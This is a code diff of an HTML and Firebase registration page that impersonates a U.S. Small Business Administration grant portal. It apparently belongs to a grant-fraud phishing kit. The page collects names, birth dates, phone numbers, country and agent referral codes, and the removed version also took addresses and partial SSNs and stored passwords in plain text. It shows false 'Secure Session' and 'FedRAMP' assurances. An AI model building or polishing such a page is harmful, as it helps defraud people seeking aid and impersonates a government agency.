@@ -3,169 +3,309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Phase 02: Verification</title>
+    <title>SBA Portal | Information Verification Profile</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        sbaNavy: '#002E6D',
+                        sbaBlue: '#0071BC',
+                        sbaRed: '#D32F2F',
+                        sbaDark: '#1E293B',
+                        sbaBg: '#F8FAFC'
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        :root { --sba-navy: #002e6d; --sba-blue: #0071bc; }
-        body { background: #f4f7f9; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        
-        .nav-mini { background: white; border-bottom: 1px solid #e2e8f0; padding: 12px 20px; }
-        .auth-card { background: white; border-top: 5px solid var(--sba-navy); box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 420px; border-radius: 4px; }
-        
-        .input-field { height: 46px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; outline: none; border-radius: 4px; font-size: 14px; transition: 0.2s; }
-        .input-field:focus { border-color: var(--sba-blue); box-shadow: 0 0 0 3px rgba(0, 113, 188, 0.1); }
-        
-        .btn-finish { background: var(--sba-navy); height: 48px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 12px; border-radius: 4px; letter-spacing: 0.5px; }
-        .btn-finish:hover { background: #001e4a; }
-        .btn-finish:disabled { opacity: 0.7; cursor: not-allowed; }
-
-        .step-bar { height: 4px; flex-grow: 1; border-radius: 2px; background: #e2e8f0; }
-        .step-bar.active { background: var(--sba-navy); }
-
-        .section-tag { font-size: 9px; font-weight: 800; color: var(--sba-navy); text-transform: uppercase; letter-spacing: 1px; border-left: 3px solid var(--sba-navy); padding-left: 8px; margin-bottom: 12px; }
+        body { 
+            background-color: #F8FAFC;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+        .input-focus-fix:focus {
+            font-size: 16px !important;
+        }
+        @media (min-width: 640px) {
+            .input-focus-fix:focus {
+                font-size: 14px !important;
+            }
+        }
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23475569' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 14px;
+        }
     </style>
 </head>
-<body class="min-h-screen flex flex-col">
+<body class="min-h-screen flex flex-col antialiased">
 
-    <nav class="nav-mini flex justify-between items-center">
-        <div class="flex items-center gap-2">
-            <div class="bg-[#002e6d] text-white px-2 py-0.5 font-bold text-lg">SBA</div>
-            <span class="text-[10px] font-bold text-gray-400 uppercase leading-tight hidden sm:block">U.S. Small Business <br> Administration</span>
+    <nav class="bg-white border-b border-slate-200 px-4 py-3.5 sm:px-8 flex justify-between items-center z-10">
+        <div class="flex items-center gap-3">
+            <div class="bg-sbaNavy text-white px-2.5 py-1 font-extrabold text-xl tracking-tight rounded-sm">SBA</div>
+            <div class="h-8 w-[1px] bg-slate-200 hidden sm:block"></div>
+            <span class="text-[10px] font-bold text-slate-400 uppercase tracking-wider leading-tight hidden sm:block">
+                U.S. Small Business<br><span class="text-sbaNavy">Administration</span>
+            </span>
         </div>
-        <div class="text-[10px] font-black text-green-600 uppercase tracking-tighter"><i class="fas fa-lock mr-1"></i> Verified Link</div>
+        <div class="text-[10px] font-bold text-emerald-600 uppercase tracking-wider flex items-center gap-1.5 bg-emerald-50 border border-emerald-200/60 px-2.5 py-1 rounded-sm">
+            <i class="fas fa-shield-halved text-emerald-500"></i> Secure Session Link
+        </div>
     </nav>
 
-    <div class="flex-grow flex items-center justify-center p-4">
-        <div class="auth-card p-7 sm:p-9">
-            <div class="flex gap-2 mb-6 items-center">
-                <div class="step-bar active"></div>
-                <div class="step-bar active"></div>
-                <div class="step-bar"></div>
+    <div class="flex-grow flex items-center justify-center px-4 py-8 sm:py-12">
+        <div class="bg-white border-t-4 border-sbaNavy rounded shadow-sm w-full max-w-[480px] p-6 sm:p-10 border border-slate-200">
+            
+            <div class="flex gap-2.5 mb-8 items-center">
+                <div class="h-1 flex-grow rounded-sm bg-sbaNavy"></div>
+                <div class="h-1 flex-grow rounded-sm bg-sbaNavy"></div>
+                <div class="h-1 flex-grow rounded-sm bg-slate-200"></div>
             </div>
 
             <div class="mb-6">
-                <h2 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verify Identity</h2>
-                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-widest mt-1">Step 2: Case Documentation</p>
+                <h1 class="text-xl font-bold text-sbaDark tracking-tight uppercase">Verify Core Identity</h1>
+                <p class="text-[11px] font-bold text-slate-400 uppercase tracking-widest mt-1">Step 2: Case Documentation Profile</p>
             </div>
 
-            <form id="finalForm" class="space-y-4">
+            <div id="alertBoundary" class="hidden mb-5 p-3.5 rounded border text-xs font-medium flex items-start gap-2.5 transition-all">
+                <i id="alertIcon" class="fas mt-0.5"></i>
+                <span id="alertMessage"></span>
+            </div>
+
+            <form id="finalForm" autocomplete="off" novalidate class="space-y-5">
                 
-                <p class="section-tag">Personal Info</p>
-                <div class="grid grid-cols-2 gap-3">
+                <div class="border-l-2 border-sbaNavy pl-2.5 mb-4">
+                    <span class="text-[10px] font-bold text-sbaNavy uppercase tracking-wider">Personal Parameters Matrix</span>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">First Name</label>
-                        <input type="text" id="fname" class="input-field" required placeholder="John">
+                        <label for="fname" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">First Name</label>
+                        <input type="text" id="fname" required 
+                            class="input-focus-fix w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 placeholder-slate-400 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150" 
+                            placeholder="John">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Last Name</label>
-                        <input type="text" id="lname" class="input-field" required placeholder="Doe">
+                        <label for="lname" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Last Name</label>
+                        <input type="text" id="lname" required 
+                            class="input-focus-fix w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 placeholder-slate-400 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150" 
+                            placeholder="Doe">
                     </div>
                 </div>
 
-                <div class="grid grid-cols-2 gap-3">
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Phone</label>
-                        <input type="tel" id="phone" class="input-field" required placeholder="(000) 000-0000">
+                        <label for="username" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Preferred Username</label>
+                        <input type="text" id="username" required 
+                            class="input-focus-fix w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 placeholder-slate-400 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150" 
+                            placeholder="johndoe12">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">D.O.B</label>
-                        <input type="date" id="dob" class="input-field" required>
-                    </div>
-                </div>
-
-                <p class="section-tag pt-2">Location & Security</p>
-                <div>
-                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Street Address</label>
-                    <input type="text" id="address" class="input-field" required placeholder="123 Main St">
-                </div>
-
-                <div class="grid grid-cols-2 gap-3">
-                    <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">City, State</label>
-                        <input type="text" id="city" class="input-field" required placeholder="City, ST">
-                    </div>
-                    <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Zip Code</label>
-                        <input type="text" id="zip" class="input-field" required placeholder="00000">
-                    </div>
-                </div>
-
-                <div class="grid grid-cols-2 gap-3 pb-2">
-                    <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">SSN (Last 4)</label>
-                        <input type="password" id="ssn" maxlength="4" class="input-field" required placeholder="••••">
-                    </div>
-                    <div>
-                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Program</label>
-                        <select id="program" class="input-field" style="padding-right: 5px;">
-                            <option value="SBA Grant">SBA Grant</option>
-                            <option value="Disaster Relief">Relief Fund</option>
+                        <label for="gender" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Gender Selection</label>
+                        <select id="gender" required 
+                            class="w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150 bg-white">
+                            <option value="" disabled selected hidden>Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                            <option value="Other">Other / Prefer not to state</option>
                         </select>
                     </div>
                 </div>
 
-                <button type="submit" id="finishBtn" class="btn-finish shadow-lg mt-2">
-                    Submit Case File <i class="fas fa-file-export ml-2"></i>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label for="phone" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Phone Number</label>
+                        <input type="tel" id="phone" required 
+                            class="input-focus-fix w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 placeholder-slate-400 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150" 
+                            placeholder="+1 (555) 000-0000">
+                    </div>
+                    <div>
+                        <label for="dob" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Date of Birth</label>
+                        <input type="date" id="dob" required 
+                            class="w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150 bg-white">
+                    </div>
+                </div>
+
+                <div class="border-l-2 border-sbaNavy pl-2.5 mb-4 pt-2">
+                    <span class="text-[10px] font-bold text-sbaNavy uppercase tracking-wider">Demographic Registration Allocations</span>
+                </div>
+
+                <div>
+                    <label for="country" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Country of Residence</label>
+                    <select id="country" required 
+                        class="w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150 bg-white">
+                        <option value="" disabled selected hidden>Select Country</option>
+                        <option value="United States">United States</option>
+                        <option value="Nigeria">Nigeria</option>
+                        <option value="United Kingdom">United Kingdom</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Ghana">Ghana</option>
+                        <option value="Other">Other / International Territory</option>
+                    </select>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label for="program" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Target Capital Program</label>
+                        <select id="program" required 
+                            class="w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150 bg-white">
+                            <option value="SBA Grant Program">SBA Capital Grant</option>
+                            <option value="Disaster Relief Capital">Disaster Relief Fund</option>
+                            <option value="Microloan Financing">Microloan Ecosystem</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label for="referredBy" class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1.5">Referral ID Code (Optional)</label>
+                        <input type="text" id="referredBy" 
+                            class="input-focus-fix w-full h-11 px-3.5 border border-slate-200 rounded text-slate-800 placeholder-slate-400 text-sm focus:outline-none focus:border-sbaBlue focus:ring-2 focus:ring-sbaBlue/10 transition-all duration-150" 
+                            placeholder="agentcode">
+                    </div>
+                </div>
+
+                <button type="submit" id="finishBtn" class="w-full bg-sbaNavy hover:bg-[#001E4A] text-white font-bold text-xs uppercase tracking-wider h-12 rounded shadow-sm flex items-center justify-center gap-2 transition-all duration-150 mt-6">
+                    <span>Submit System Case File</span>
+                    <i class="fas fa-file-export text-[10px]"></i>
                 </button>
             </form>
+
         </div>
     </div>
 
-    <footer class="p-6 text-center">
-        <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[0.2em]">
-            <i class="fas fa-shield-alt mr-1"></i> Secure 256-Bit Federal Environment
+    <footer class="bg-white border-t border-slate-200 p-5 text-center mt-auto">
+        <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[0.25em] flex items-center justify-center gap-1.5">
+            <i class="fas fa-lock text-slate-300"></i> Cryptographic 256-Bit FedRAMP Authenticated Environment
         </p>
     </footer>
 
     <script type="module">
-        import { auth, db } from './firebase-config.js';
-        import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { auth, db, getRegistrationData, buildNewUserPayload } from './firebase-config.js';
+        import { createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        document.getElementById('finalForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('finishBtn');
-            const email = sessionStorage.getItem('reg_email');
-            const pass = sessionStorage.getItem('reg_pass') || "google-auth-user";
-            
-            if(!email) { window.location.href="register1.html"; return; }
+        const alertBoundary = document.getElementById('alertBoundary');
+        const alertIcon = document.getElementById('alertIcon');
+        const alertMessage = document.getElementById('alertMessage');
+        const finalForm = document.getElementById('finalForm');
+        const finishBtn = document.getElementById('finishBtn');
 
-            btn.disabled = true;
-            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Processing...`;
+        // Verify session integrity immediately upon runtime initialization
+        const sessionPayload = getRegistrationData();
+        if (!sessionPayload || !sessionPayload.email) {
+            window.location.href = "register1.html";
+        }
+
+        // Dynamic State-Driven Operational Notification Renderer
+        function triggerFormAlert(message, type = 'error') {
+            alertBoundary.className = "mb-5 p-3.5 rounded border text-xs font-medium flex items-start gap-2.5 transition-all duration-150";
+            if (type === 'error') {
+                alertBoundary.classList.add('bg-red-50', 'border-red-200', 'text-red-700');
+                alertIcon.className = "fas fa-circle-exclamation mt-0.5 text-red-500";
+            } else {
+                alertBoundary.classList.add('bg-blue-50', 'border-blue-200', 'text-blue-700');
+                alertIcon.className = "fas fa-circle-notch fa-spin mt-0.5 text-blue-500";
+            }
+            alertMessage.textContent = message;
+            alertBoundary.classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Ingestion Form Submit Signal Interceptor System
+        finalForm.onsubmit = async function(e) {
+            e.preventDefault();
+
+            const firstName = document.getElementById('fname').value.trim();
+            const lastName = document.getElementById('lname').value.trim();
+            const usernameInput = document.getElementById('username').value.trim().toLowerCase();
+            const genderInput = document.getElementById('gender').value;
+            const phoneInput = document.getElementById('phone').value.trim();
+            const dobInput = document.getElementById('dob').value;
+            const countryInput = document.getElementById('country').value;
+            const programInput = document.getElementById('program').value;
+            const referralCode = document.getElementById('referredBy').value.trim();
+
+            // Explicit Strict Multi-Step Parameter Field Validation Checks
+            if (!firstName || !lastName || !usernameInput || !genderInput || !phoneInput || !dobInput || !countryInput) {
+                triggerFormAlert("Validation Constraints Unfulfilled: Every required systemic configuration parameter must be filled explicitly.");
+                return;
+            }
+
+            if (usernameInput.length < 4) {
+                triggerFormAlert("Validation Constraint Violation: Target Username context requires an absolute length of at least 4 alphanumeric characters.");
+                return;
+            }
+
+            // Lock submission interface UI states
+            finishBtn.disabled = true;
+            finishBtn.innerHTML = `<i class="fas fa-circle-notch fa-spin mr-2"></i> Deploying Immutable Identity Case...`;
+            triggerFormAlert("Provisioning cloud authentication instances and generating secure user schemas...", "processing");
 
             try {
-                let uid;
-                if(!sessionStorage.getItem('is_google')) {
-                    const res = await createUserWithEmailAndPassword(auth, email, pass);
-                    uid = res.user.uid;
+                let currentUid = "";
+                const userEmail = sessionPayload.email;
+
+                // Handle routing criteria depending on authentication entry structures
+                if (sessionPayload.isGoogleAccount === true) {
+                    if (auth.currentUser) {
+                        currentUid = auth.currentUser.uid;
+                    } else {
+                        throw new Error("Federated directory state dropped. Re-authenticate access matrix sequence.");
+                    }
                 } else {
-                    uid = auth.currentUser.uid;
+                    const userCredential = await createUserWithEmailAndPassword(auth, userEmail, sessionPayload.password);
+                    currentUid = userCredential.user.uid;
+                    
+                    // Dispatch background parallel threat verification security email link
+                    try {
+                        await sendEmailVerification(userCredential.user);
+                    } catch (emailErr) {
+                        console.warn("[SBA Registration] Non-blocking mail failure encountered:", emailErr.message);
+                    }
                 }
 
-                await setDoc(doc(db, "users", uid), {
-                    uid: uid,
-                    email: email,
-                    password: pass,
-                    fullName: document.getElementById('fname').value + " " + document.getElementById('lname').value,
-                    phone: document.getElementById('phone').value,
-                    dob: document.getElementById('dob').value,
-                    address: document.getElementById('address').value,
-                    city: document.getElementById('city').value,
-                    zip: document.getElementById('zip').value,
-                    ssn_last4: document.getElementById('ssn').value,
-                    program: document.getElementById('program').value,
-                    balance: 0,
-                    kycStatus: "PENDING",
-                    registeredAt: new Date().toISOString()
+                // Compile structured system payload matching our backend database maps perfectly
+                const fullyQualifiedPayload = buildNewUserPayload({
+                    uid: currentUid,
+                    fullName: `${firstName} ${lastName}`,
+                    username: usernameInput,
+                    email: userEmail,
+                    phoneNumber: phoneInput,
+                    country: countryInput,
+                    gender: genderInput,
+                    dob: dobInput,
+                    referredBy: referralCode || "none",
+                    registrationStep: 3
                 });
 
-                sessionStorage.clear();
-                window.location.href = "welcome.html";
+                // Attach structural auxiliary platform metadata fields dynamically inside the core profile
+                fullyQualifiedPayload.allocatedProgram = programInput;
+
+                // Commit transactional operational profile map directly into Firestore
+                await setDoc(doc(db, "users", currentUid), fullyQualifiedPayload);
+
+                // Surgical removal of cache indices without clearing global cross-system browser metrics
+                sessionStorage.removeItem("SBA_REGISTRATION_DATA_FLOW");
+
+                // Route verified entry session cleanly into onboarding status landing page
+                window.location.href = "verify.html";
+
             } catch (err) {
-                alert("System Error: " + err.message);
-                btn.disabled = false;
-                btn.innerText = "Submit Case File";
+                finishBtn.disabled = false;
+                finishBtn.innerHTML = `<span>Submit System Case File</span><i class="fas fa-file-export text-[10px]"></i>`;
+                
+                let systemFriendlyErrorMessage = err.message;
+                if (err.code === 'auth/email-already-in-use') {
+                    systemFriendlyErrorMessage = "Administrative Warning: An operational identity profile with this specific email configuration already exists.";
+                } else if (err.code === 'auth/weak-password') {
+                    systemFriendlyErrorMessage = "Security Level Warning: The provided access credential configuration pattern is too weak for production use.";
+                }
+                
+                triggerFormAlert(systemFriendlyErrorMessage);
             }
         };
     </script>
